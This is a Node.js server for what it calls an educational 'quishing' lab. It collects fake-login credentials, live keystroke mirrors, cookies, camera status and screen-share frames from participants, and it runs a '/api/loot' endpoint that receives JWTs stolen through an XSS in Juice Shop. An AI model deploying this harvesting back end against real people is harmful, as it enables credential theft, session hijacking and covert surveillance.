require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const os = require('os');
const path = require('path');

const PORT = parseInt(process.env.PORT || '3000', 10);
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const ENABLE_FAKE_LOGIN = process.env.ENABLE_FAKE_LOGIN !== 'false';
const PUBLIC_URL = process.env.PUBLIC_URL || '';
// IP de la red local para las URLs del arsenal QR y el endpoint-trampa.
// En VMs con varias interfaces se puede fijar con LAN_IP en .env.
function detectLanIp() {
  for (const addrs of Object.values(os.networkInterfaces())) {
    for (const a of addrs || []) {
      if ((a.family !== 'IPv4' && a.family !== 4) || a.internal) continue;
      // Dentro de Docker la única IPv4 suele ser la del propio contenedor
      // (rango 172.16/12): mejor no adivinar que poner una IP inútil en los QR.
      if (/^172\.(1[6-9]|2\d|3[01])\./.test(a.address)) continue;
      return a.address;
    }
  }
  return '';
}
const LAN_IP = process.env.LAN_IP || detectLanIp();

if (!ADMIN_TOKEN) {
  throw new Error('ADMIN_TOKEN es obligatorio. Copia .env.example a .env y define un token largo y aleatorio.');
}

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', true);
// Los frames de pantalla (JPEG en base64) pesan más que un evento normal;
// solo /api/screen usa el parser grande, el resto mantiene el límite estricto.
const jsonSmall = express.json({ limit: '8kb' });
const jsonBig = express.json({ limit: '3mb' });
app.use((req, res, next) => (req.path === '/api/screen' ? jsonBig : jsonSmall)(req, res, next));
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'no-referrer');
  next();
});

// ---------- almacenamiento efímero (solo memoria; nada sobrevive al reinicio) ----------
const sessions = new Map();
const events = [];
const adminClients = new Set();
const publicClients = new Set();
const pendingPublicCommands = new Map();
const loots = []; // botín recibido por el endpoint-trampa /api/loot
const COMMAND_TTL_MS = 5 * 60 * 1000;

// Etiquetas legibles y estables para cualquier cantidad de participantes:
// A…Z, AA…AZ, BA… No limitamos la demo a cuatro teléfonos.
function sessionLabel(index) {
  let label = '';
  let value = index + 1;
  while (value > 0) {
    value -= 1;
    label = String.fromCharCode(65 + (value % 26)) + label;
    value = Math.floor(value / 26);
  }
  return label;
}

const ALLOWED = new Set([
  'landing_viewed', 'fake_login_submitted', 'keystroke', 'cookies_collected',
  'camera_request_clicked', 'camera_permission_granted',
  'camera_permission_denied', 'camera_preview_active', 'camera_stopped',
  'screen_share_started', 'screen_share_denied', 'screen_share_stopped',
  'reveal_seen', 'session_ended'
]);

function parseBrowser(ua = '') {
  if (/Edg\//.test(ua)) return 'Edge';
  if (/OPR\//.test(ua)) return 'Opera';
  if (/Chrome\//.test(ua)) return 'Chrome';
  if (/Safari\//.test(ua)) return 'Safari';
  if (/Firefox\//.test(ua)) return 'Firefox';
  return 'Otro';
}
function parseOS(ua = '') {
  if (/Windows/.test(ua)) return 'Windows';
  if (/Android/.test(ua)) return 'Android';
  if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
  if (/Mac OS/.test(ua)) return 'macOS';
  if (/Linux/.test(ua)) return 'Linux';
  return 'Otro';
}

function pushEvent(ev) {
  events.push(ev);
  if (events.length > 800) events.shift();
  const msg = 'data: ' + JSON.stringify({ kind: 'event', ev }) + '\n\n';
  for (const res of adminClients) res.write(msg);
}
function pushPublic(obj) {
  const msg = 'data: ' + JSON.stringify(obj) + '\n\n';
  for (const res of publicClients) res.write(msg);
}

// Los Quick Tunnels de Cloudflare no garantizan streams SSE. Guardamos la
// orden por sesión para que el teléfono también pueda recibirla por polling.
// Al asociarla con las sesiones existentes, un participante que llegue luego
// no recibe una revelación o reinicio viejo.
function issuePublicCommand(kind) {
  const command = { id: crypto.randomUUID(), kind, issued_at: Date.now() };
  for (const session of sessions.values()) {
    pendingPublicCommands.set(session.id, command);
  }
  pushPublic(command);
  return command;
}

function prunePublicCommands() {
  const cutoff = Date.now() - COMMAND_TTL_MS;
  for (const [sessionId, command] of pendingPublicCommands) {
    if (command.issued_at < cutoff) pendingPublicCommands.delete(sessionId);
  }
}

// rate limit simple para /api/events
const rl = new Map();
function rateLimit(req, res, next) {
  const now = Date.now();
  const arr = (rl.get(req.ip) || []).filter(t => now - t < 10000);
  if (arr.length >= 30) return res.status(429).json({ error: 'demasiados eventos' });
  arr.push(now);
  rl.set(req.ip, arr);
  next();
}

// límite más holgado para el espejo en vivo y los frames de pantalla, que son
// de alta frecuencia (tecleo + ~2 fps) y no eventos discretos.
const rlLive = new Map();
function rateLimitLive(req, res, next) {
  const now = Date.now();
  const arr = (rlLive.get(req.ip) || []).filter(t => now - t < 10000);
  if (arr.length >= 120) return res.status(429).json({ error: 'demasiado trafico en vivo' });
  arr.push(now);
  rlLive.set(req.ip, arr);
  next();
}

// ---------- API pública ----------
app.post('/api/session', (req, res) => {
  const b = req.body || {};
  const id = crypto.randomUUID();
  const label = sessionLabel(sessions.size);
  const s = {
    id, label, created_at: Date.now(), last_seen: Date.now(), stage: 'landing',
    browser: parseBrowser(b.ua), os: parseOS(b.ua),
    data: {
      lang: String(b.lang || '').slice(0, 20), tz: String(b.tz || '').slice(0, 40),
      screen: String(b.screen || '').slice(0, 20),
      cores: b.cores > 0 ? b.cores | 0 : null,
      mem: b.mem > 0 ? b.mem | 0 : null,
      conn: String(b.conn || '').slice(0, 10),
      battery: (b.battery === null || b.battery === undefined) ? null : Math.max(0, Math.min(100, b.battery | 0)),
      login: null, cam: 'sin solicitar', share: 'sin solicitar',
      // espejo en vivo de la pestaña (lo reporta la propia landing)
      mirror: { section: 'stage1', email: '', pass: '' }
    }
  };
  sessions.set(id, s);
  pushEvent({ id: crypto.randomUUID(), session_id: id, type: 'session_started', created_at: Date.now(), label });
  res.json({ id, label, fakeLogin: ENABLE_FAKE_LOGIN });
});

app.post('/api/events', rateLimit, (req, res) => {
  const { session_id, type, payload = {} } = req.body || {};
  if (!ALLOWED.has(type)) return res.status(400).json({ error: 'evento no permitido' });
  const s = sessions.get(session_id);
  if (!s) return res.status(404).json({ error: 'sesión no encontrada' });
  s.last_seen = Date.now();
  const clean = {};
  if (type === 'fake_login_submitted') {
    clean.email = String(payload.email || '').slice(0, 120);
    clean.password = String(payload.password || '').slice(0, 120);
    s.data.login = { email: clean.email, password: clean.password };
    s.stage = 'login';
  }
  if (type === 'keystroke') {
    clean.field = String(payload.field || '').slice(0, 20);
    clean.len = Math.min(200, payload.len | 0);
  }
  if (type === 'cookies_collected') {
    // Solo cookies visibles para JavaScript. Los valores se almacenan ya
    // enmascarados por el cliente: nunca guardamos el valor real.
    clean.cookies = (Array.isArray(payload.cookies) ? payload.cookies : []).slice(0, 30).map(c => ({
      name: String(c.name || '').slice(0, 60),
      value: String(c.value || '').slice(0, 40)
    }));
    s.data.cookies = clean.cookies;
  }
  if (type === 'camera_permission_granted') { s.data.cam = 'concedido'; s.stage = 'camara'; }
  if (type === 'camera_permission_denied') { s.data.cam = 'rechazado'; }
  if (type === 'camera_preview_active') { s.data.cam = 'vista previa activa'; }
  if (type === 'camera_stopped') { s.data.cam = 'detenido'; }
  if (type === 'screen_share_started') { s.data.share = 'compartiendo'; s.stage = 'pantalla'; }
  if (type === 'screen_share_denied') { s.data.share = 'rechazado'; }
  if (type === 'screen_share_stopped') { s.data.share = 'detenido'; s.frame = null; }
  if (type === 'reveal_seen') { s.stage = 'revelado'; }
  pushEvent({ id: crypto.randomUUID(), session_id, type, created_at: Date.now(), label: s.label, payload: clean });
  res.json({ ok: true });
});

// Botín del arsenal QR: el XSS en Juice Shop envía el JWT aquí. Es un
// endpoint-trampa a propósito SIN auth (la víctima no tiene sesión con esta
// app). Igual de efímero que todo lo demás: memoria, rate limit y tope.
function jwtEmail(token) {
  try {
    const parts = String(token).split('.');
    if (parts.length !== 3) return null;
    const b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
    const payload = JSON.parse(Buffer.from(b64, 'base64').toString('utf8'));
    const email = payload && payload.data && payload.data.email;
    return typeof email === 'string' ? email.slice(0, 120) : null;
  } catch (_) { return null; }
}

app.get('/api/loot', rateLimit, (req, res) => {
  const loot = String(req.query.loot || '').slice(0, 2000);
  const stolen = loot !== '' && loot !== 'none';
  const entry = {
    id: crypto.randomUUID(), ts: Date.now(), ip: req.ip,
    ua: String(req.headers['user-agent'] || '').slice(0, 120),
    stolen, email: null, token: loot
  };
  if (stolen) entry.email = jwtEmail(loot);
  loots.push(entry);
  if (loots.length > 200) loots.shift();
  pushEvent({ id: crypto.randomUUID(), type: 'loot_received', created_at: Date.now(), payload: { stolen, email: entry.email } });
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.status(204).end();
});

// Espejo en vivo de la pestaña: la landing reporta qué ve/escribe la persona.
// Solo llega al panel (que corre en localhost); nada se persiste.
app.post('/api/mirror', rateLimitLive, (req, res) => {
  const { session_id, section, email, pass } = req.body || {};
  const s = sessions.get(session_id);
  if (!s) return res.status(404).json({ error: 'sesión no encontrada' });
  s.last_seen = Date.now();
  s.data.mirror = {
    section: String(section || '').slice(0, 20),
    email: String(email || '').slice(0, 120),
    pass: String(pass || '').slice(0, 120)
  };
  const msg = 'data: ' + JSON.stringify({ kind: 'mirror', id: s.id, label: s.label, mirror: s.data.mirror }) + '\n\n';
  for (const r of adminClients) r.write(msg);
  res.json({ ok: true });
});

// Frame de pantalla compartida (JPEG base64). Solo existe si la persona pulsó
// el diálogo nativo del navegador y eligió qué compartir. Guardamos únicamente
// el último frame en memoria y lo empujamos al panel por SSE local.
app.post('/api/screen', rateLimitLive, (req, res) => {
  const { session_id, frame } = req.body || {};
  const s = sessions.get(session_id);
  if (!s) return res.status(404).json({ error: 'sesión no encontrada' });
  if (typeof frame !== 'string' || !frame.startsWith('data:image/') || frame.length > 2_500_000) {
    return res.status(400).json({ error: 'frame inválido' });
  }
  s.last_seen = Date.now();
  s.frame = { url: frame, ts: Date.now() };
  const msg = 'data: ' + JSON.stringify({ kind: 'frame', id: s.id, label: s.label, frame }) + '\n\n';
  for (const r of adminClients) r.write(msg);
  res.json({ ok: true });
});

app.get('/api/session/mine', (req, res) => {
  const s = sessions.get(String(req.query.id || ''));
  if (!s) return res.status(404).json({ error: 'no encontrada' });
  res.json({ label: s.label, browser: s.browser, os: s.os, data: s.data, created_at: s.created_at });
});

app.get('/api/session/command', (req, res) => {
  prunePublicCommands();
  const sessionId = String(req.query.id || '');
  const command = pendingPublicCommands.get(sessionId);
  // Una respuesta vacía es normal: no hay una orden pendiente para esta sesión.
  res.json(command || { kind: null });
});

app.get('/api/config', (req, res) => {
  res.json({ publicUrl: PUBLIC_URL, fakeLogin: ENABLE_FAKE_LOGIN, lanIp: LAN_IP });
});

// ---------- SSE ----------
app.get('/api/live', (req, res) => {
  res.status(200).set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no'
  });
  res.flushHeaders();
  // Cloudflare puede retener comentarios SSE y la directiva `retry` sola.
  // Un evento de datos inicial fuerza la entrega del stream al EventSource.
  res.write('retry: 3000\ndata: {"kind":"connected"}\n\n');
  const isAdmin = String(req.query.token || '') === ADMIN_TOKEN;
  const set = isAdmin ? adminClients : publicClients;
  set.add(res);
  // Evita que proxies, túneles y redes móviles cierren un SSE inactivo.
  const heartbeat = setInterval(() => res.write('data: {"kind":"heartbeat"}\n\n'), 20_000);
  req.on('close', () => {
    clearInterval(heartbeat);
    set.delete(res);
  });
});

// ---------- admin ----------
function auth(req, res, next) {
  if (req.headers['x-admin-token'] === ADMIN_TOKEN || req.query.token === ADMIN_TOKEN) return next();
  res.status(401).json({ error: 'no autorizado' });
}

app.get('/api/admin/stats', auth, (req, res) => {
  const all = [...sessions.values()];
  const c = {
    visitas: all.length,
    logins: all.filter(s => s.data.login).length,
    camSolicitudes: all.filter(s => s.data.cam !== 'sin solicitar').length,
    camAceptadas: all.filter(s => ['concedido', 'vista previa activa'].includes(s.data.cam)).length,
    camRechazadas: all.filter(s => s.data.cam === 'rechazado').length,
    pantallas: all.filter(s => s.data.share === 'compartiendo').length,
    lootEjec: loots.length,
    lootRobos: loots.filter(l => l.stolen).length
  };
  res.json({
    sessions: all.map(s => ({
      id: s.id, label: s.label, stage: s.stage, browser: s.browser, os: s.os,
      last_seen: s.last_seen, data: s.data
    })),
    events: events.slice(-60).reverse(),
    counters: c,
    loots: loots.slice(-50).reverse()
  });
});

app.post('/api/admin/reveal', auth, (req, res) => {
  issuePublicCommand('reveal');
  pushEvent({ id: crypto.randomUUID(), type: 'reveal_activated', created_at: Date.now(), payload: {} });
  res.json({ ok: true });
});

app.post('/api/admin/reset', auth, (req, res) => {
  issuePublicCommand('reset');
  sessions.clear();
  events.length = 0;
  loots.length = 0;
  res.json({ ok: true });
});

app.get('/health', (req, res) => res.json({ ok: true, sessions: sessions.size, uptime_s: Math.round(process.uptime()) }));

app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.use(express.static(path.join(__dirname, 'public')));

app.listen(PORT, '0.0.0.0', () => {
  console.log('============================================');
  console.log('  QUISHING LAB — demo educativa (efímera)');
  console.log('  Landing:   http://localhost:' + PORT + '/');
  console.log('  Panel:     http://localhost:' + PORT + '/admin');
  console.log('  LAN:       http://' + (LAN_IP || 'IP-LAN') + ':4000 (Juice Shop — cebo del arsenal)');
  console.log('  Token:     definido en .env');
  console.log('  Túnel:     cloudflared tunnel --url http://localhost:' + PORT);
  console.log('============================================');
});
